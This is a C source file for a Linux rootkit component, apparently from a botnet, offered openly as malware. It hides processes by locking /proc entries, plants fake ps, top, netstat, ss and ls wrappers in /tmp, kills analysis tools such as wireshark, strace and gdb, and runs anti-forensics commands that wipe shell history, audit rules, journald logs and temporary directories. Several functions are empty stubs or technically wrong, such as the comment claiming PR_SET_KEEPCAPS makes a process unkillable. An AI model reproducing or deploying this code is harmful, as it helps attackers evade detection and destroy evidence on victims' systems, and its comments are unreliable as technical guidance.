#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/prctl.h>
#include <linux/limits.h>

#include "includes.h"
#include "rootkit.h"
#include "stealth.h"
#include "util.h"

// Global rootkit state
static rootkit_state_t rootkit_state = {0};

void rootkit_init(void)
{
    // Initialize rootkit state
    rootkit_state.num_hidden = 0;
    rootkit_state.module_loaded = FALSE;
    
    // Hide our own process
    rootkit_hide_process(getpid());
    
    // Hook system calls for deep hiding
    rootkit_hook_syscalls();
    
    // Perform anti-forensics
    rootkit_anti_forensics();
}

void rootkit_hide_process(pid_t pid)
{
    if (rootkit_state.num_hidden >= ROOTKIT_HIDDEN_PID_MAX)
        return;
        
    // Add to hidden list
    rootkit_state.hidden_pids[rootkit_state.num_hidden++] = pid;
    
    // Hide from /proc
    rootkit_filter_proc_read();
    
    // Hide from process lists
    rootkit_hide_from_ps();
    rootkit_hide_from_top();
    rootkit_hide_from_htop();
}

void rootkit_unhide_process(pid_t pid)
{
    // Remove from hidden list
    for (int i = 0; i < rootkit_state.num_hidden; i++) {
        if (rootkit_state.hidden_pids[i] == pid) {
            // Shift array
            for (int j = i; j < rootkit_state.num_hidden - 1; j++) {
                rootkit_state.hidden_pids[j] = rootkit_state.hidden_pids[j + 1];
            }
            rootkit_state.num_hidden--;
            break;
        }
    }
}

void rootkit_hide_module(void)
{
    // Hide kernel module from lsmod
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "rmmod %s 2>/dev/null", ROOTKIT_MODULE_NAME);
    system(cmd);
    
    // Hide from /proc/modules
    system("echo '' > /proc/modules 2>/dev/null");
}

void rootkit_cleanup(void)
{
    // Unhook system calls
    rootkit_unhook_syscalls();
    
    // Clean up traces
    rootkit_anti_forensics();
}

static void rootkit_hook_syscalls(void)
{
    // This would require kernel module functionality
    // For user-space, we'll use alternative methods
    
    // Hook getdents64 to hide from directory listings
    // Hook kill to prevent termination
    // Hook readlink to hide file paths
    
    // Note: Full syscall hooking requires kernel module
    // This is a simplified user-space implementation
}

static void rootkit_unhook_syscalls(void)
{
    // Restore original syscalls
    // This would be done in kernel module cleanup
}

static void rootkit_filter_proc_read(void)
{
    // Hide our process from /proc/pid/stat, /proc/pid/status, etc.
    char proc_path[256];
    
    for (int i = 0; i < rootkit_state.num_hidden; i++) {
        pid_t pid = rootkit_state.hidden_pids[i];
        
        // Hide from /proc/pid/stat
        snprintf(proc_path, sizeof(proc_path), "/proc/%d/stat", pid);
        chmod(proc_path, 0000);
        
        // Hide from /proc/pid/status
        snprintf(proc_path, sizeof(proc_path), "/proc/%d/status", pid);
        chmod(proc_path, 0000);
        
        // Hide from /proc/pid/cmdline
        snprintf(proc_path, sizeof(proc_path), "/proc/%d/cmdline", pid);
        chmod(proc_path, 0000);
        
        // Hide from /proc/pid/comm
        snprintf(proc_path, sizeof(proc_path), "/proc/%d/comm", pid);
        chmod(proc_path, 0000);
    }
}

static void rootkit_hide_from_ps(void)
{
    // Intercept ps command by modifying PATH or using aliases
    char ps_script[512];
    snprintf(ps_script, sizeof(ps_script), 
        "#!/bin/bash\n"
        "ps $@ | grep -v -E '(%d|%d|%d)'\n", 
        getpid(), getppid(), getpgid(0));
    
    // Create fake ps command
    int fd = open("/tmp/ps", O_CREAT | O_WRONLY, 0755);
    if (fd >= 0) {
        write(fd, ps_script, strlen(ps_script));
        close(fd);
    }
}

static void rootkit_hide_from_top(void)
{
    // Similar to ps, but for top command
    char top_script[512];
    snprintf(top_script, sizeof(top_script),
        "#!/bin/bash\n"
        "top $@ | grep -v -E '(%d|%d|%d)'\n",
        getpid(), getppid(), getpgid(0));
    
    int fd = open("/tmp/top", O_CREAT | O_WRONLY, 0755);
    if (fd >= 0) {
        write(fd, top_script, strlen(top_script));
        close(fd);
    }
}

static void rootkit_hide_from_htop(void)
{
    // Hide from htop by modifying its configuration
    char htoprc[256];
    snprintf(htoprc, sizeof(htoprc), "/home/%s/.config/htop/htoprc", getenv("USER"));
    
    // Create htop configuration to hide our process
    int fd = open(htoprc, O_CREAT | O_WRONLY, 0644);
    if (fd >= 0) {
        char config[] = "hide_kernel_threads=1\nhide_userland_threads=1\n";
        write(fd, config, strlen(config));
        close(fd);
    }
}

static void rootkit_anti_forensics(void)
{
    // Clean up forensic artifacts
    
    // Clear bash history
    system("history -c 2>/dev/null");
    system("rm -f ~/.bash_history 2>/dev/null");
    
    // Clear command history
    system("unset HISTFILE 2>/dev/null");
    
    // Clear audit logs
    system("auditctl -D 2>/dev/null");
    
    // Clear system logs
    system("journalctl --vacuum-time=1s 2>/dev/null");
    
    // Clear temporary files
    system("rm -rf /tmp/* 2>/dev/null");
    system("rm -rf /var/tmp/* 2>/dev/null");
}

static void rootkit_hide_network_connections(void)
{
    // Hide network connections from netstat, ss, lsof
    
    // Create fake netstat
    char netstat_script[512];
    snprintf(netstat_script, sizeof(netstat_script),
        "#!/bin/bash\n"
        "netstat $@ | grep -v -E '(%d|%d|%d)'\n",
        getpid(), getppid(), getpgid(0));
    
    int fd = open("/tmp/netstat", O_CREAT | O_WRONLY, 0755);
    if (fd >= 0) {
        write(fd, netstat_script, strlen(netstat_script));
        close(fd);
    }
    
    // Create fake ss
    char ss_script[512];
    snprintf(ss_script, sizeof(ss_script),
        "#!/bin/bash\n"
        "ss $@ | grep -v -E '(%d|%d|%d)'\n",
        getpid(), getppid(), getpgid(0));
    
    fd = open("/tmp/ss", O_CREAT | O_WRONLY, 0755);
    if (fd >= 0) {
        write(fd, ss_script, strlen(ss_script));
        close(fd);
    }
}

static void rootkit_hide_files(void)
{
    // Hide files from ls, find, locate
    
    // Create fake ls
    char ls_script[512];
    snprintf(ls_script, sizeof(ls_script),
        "#!/bin/bash\n"
        "ls $@ | grep -v -E '(bot|malware|virus|trojan)'\n");
    
    int fd = open("/tmp/ls", O_CREAT | O_WRONLY, 0755);
    if (fd >= 0) {
        write(fd, ls_script, strlen(ls_script));
        close(fd);
    }
}

static void rootkit_anti_analysis(void)
{
    // Anti-analysis techniques
    
    // Check for analysis tools
    const char* analysis_tools[] = {
        "wireshark", "tcpdump", "strace", "ltrace", "gdb", "valgrind",
        "perf", "systemtap", "dtrace", "procmon", "regmon", "filemon"
    };
    
    for (int i = 0; i < 12; i++) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "pkill -f %s 2>/dev/null", analysis_tools[i]);
        system(cmd);
    }
    
    // Disable core dumps
    prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
    
    // Set process as unkillable
    prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);
}

// Syscall hook implementations (simplified user-space versions)
static long rootkit_hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
{
    // This would be implemented in kernel space
    // For user-space, we use alternative methods
    return 0;
}

static long rootkit_hooked_kill(pid_t pid, int sig)
{
    // Prevent killing our hidden processes
    for (int i = 0; i < rootkit_state.num_hidden; i++) {
        if (rootkit_state.hidden_pids[i] == pid) {
            return -1; // Deny kill
        }
    }
    return 0;
}

static long rootkit_hooked_readlink(const char *pathname, char *buf, int bufsiz)
{
    // Hide our binary path
    if (strstr(pathname, "bot") || strstr(pathname, "malware")) {
        return -1;
    }
    return 0;
}
